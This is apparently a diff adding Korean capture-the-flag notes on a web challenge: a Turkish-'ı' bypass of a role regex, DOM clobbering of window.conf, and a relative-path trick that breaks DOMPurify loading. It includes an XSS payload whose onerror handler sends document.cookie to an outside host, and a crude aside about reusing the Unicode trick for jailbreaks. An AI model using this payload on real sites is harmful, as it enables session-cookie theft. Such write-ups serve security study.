@@ -1,0 +1,24 @@
+1. const regex = /^(ADMIN|INSPECTOR)$/i;의 문제로 setRole에서 걸려 role을 변경할 수 없는 문제는
+   admın과 같이 터키어 i를 사용하면 된다. 문자로 다르지만 toUpperCase가 적용되면 영어 I로 바뀌게 된다.
+   시발, 이거 python이나 다른 언어에도 적용된다고 하니깐 다음에 jailbreak할 때 써먹어야지
+
+2. 그렇게 해서 post를 작성하는데, window.conf 부분에서 dom clobbering이 가능하다.
+   id conf인 것을 두 개 준비해서 window.conf로 리스트가 나오게 하면
+   그때 name으로 접근이 가능하기에 다음과 같은 페이로드를 짤 수 있다.
+   <area id="conf">
+   <area id="conf" name="deleteUrl" href="/admin/test/?title=dummy&content=<img src=x onerror='location.href=`''' + link + '''/${document.cookie}`'>">
+
+   #delete를 클릭하면 window.conf.deleteUrl을 지우는데 이걸 실제로 넣어보면 deleteUrl은 밑의 area tag가 나오는 걸 알 수 있다.
+
+3. DOMPurify js 파일은 상대경로로 파일을 받는데
+   ../js/purify.min.js이다.
+   index.js에서 app.use(express.static(path.join(__dirname, 'public')));과 같은 코드가 있기에
+   실제로 <link>/admin/test에서 요청을 보내면
+   test는 파일로 처리하기에
+   <link>/public/admin/../js/purify.min.js로 처리되어 <link>/public/js/purify.min.js로 처리된다.
+   근데 만약 <link>/admin/test/에서 요청을 보내면
+   nodejs는 똑같은 경로로 취급하지만 브라우저는 test가 일종의 directory라고 판단하여
+   <link>/public/admin/test/../js/purify.min.js으로 처리되어
+   <link>/public/admin/js/purify.min.js로 처리된다.
+   근데 실제로는 그런 파일이 없기에 못 불러오고, DOMPurify가 정의되어 있지 않기 떄문에
+   DOMPurify.sanitize에서 오류가 발생하여 try ~ catch가 발동해 content의 값이 그대로 들어간다.
